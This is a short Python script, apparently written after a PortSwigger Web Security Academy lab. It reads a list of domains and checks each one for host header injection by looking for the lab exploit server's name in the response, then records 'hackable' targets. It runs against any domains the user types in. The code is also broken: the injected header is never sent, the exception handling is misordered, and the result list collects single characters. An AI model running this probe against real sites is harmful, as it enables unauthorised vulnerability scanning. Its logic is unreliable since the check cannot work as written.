import requests
import re

lines = []
Hackable =[]
print('enter lines:-')
while True:
    line = input()
    if line:
        lines.append(line)
    else:
        break
y=len(lines)           
for i in range(0,y):
    x=lines[i]
    url= "https://"+x
    headers={'X-Forwarded-Host': 'https://exploit-acab1f521fe4b5b7c0d35826016f0044.web-security-academy.net/'}
    try:
    	r = requests.get(url,timeout=10)
    	r.raise_for_status()
    except requests.exceptions.RequestException as err:
    	print ("OOps: Something Else",err)
    except requests.exceptions.HTTPError as errh:
    	print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
    	print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
    	print ("Timeout Error:",errt)     
    y=r.status_code
    if y==200:
 	   	    z=r.text
 	   	    b=(re.search('exploit.ac', z, re.IGNORECASE))
 	   	    if b:
 	   	    	print("nice")
 	   	    	print(url)
 	   	    	Hackable += url
 	   	    else:
 	   	    	print("sorry")
    else:
        	print("status error")
print(Hackable)
